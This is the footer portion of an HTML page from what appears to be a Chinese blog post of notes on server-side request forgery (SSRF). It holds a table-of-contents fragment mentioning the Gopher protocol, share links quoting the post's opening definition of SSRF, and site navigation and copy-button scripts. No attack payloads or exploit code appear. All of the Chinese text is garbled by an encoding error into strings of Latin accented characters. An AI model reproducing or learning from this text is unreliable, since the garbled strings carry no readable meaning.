class="toc-text">å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª_?</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&text=SSRFå­¦ä¹ "><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&is_video=false&description=SSRFå­¦ä¹ "><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SSRFå­¦ä¹ &body=Check out this article: http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&name=SSRFå­¦ä¹ &description=&lt;h1 id=&#34;SSRF-Server-Side-Request-Forgery-æ¦‚è¿°&#34;&gt;&lt;a href=&#34;#SSRF-Server-Side-Request-Forgery-æ¦‚è¿°&#34; class=&#34;headerlink&#34; title=&#34;SSRF(Server-Side Request Forgery)æ¦‚è¿°&#34;&gt;&lt;/a&gt;SSRF(Server-Side Request Forgery)æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )&lt;/strong&gt;,å­—é¢æ„æ€æ¥ç†è§£å°±æ˜¯ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è¾¾åˆ°ä¼ªè£…äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘å‘èµ·çš„æ¶æ„è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿå› æ­¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&t=SSRFå­¦ä¹ "><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> èœå•</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> ç›®å½•</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> è¿”å›é¡¶éƒ¨</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    y@7q
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">é¦–é¡µ</a></li><!--
     --><!--
       --><li><a href="/about/">å…³äº</a></li><!--
     --><!--
       --><li><a href="/archives/">å½’æ¡£</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">é¡¹ç›®</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿ï¼\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸï¼");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
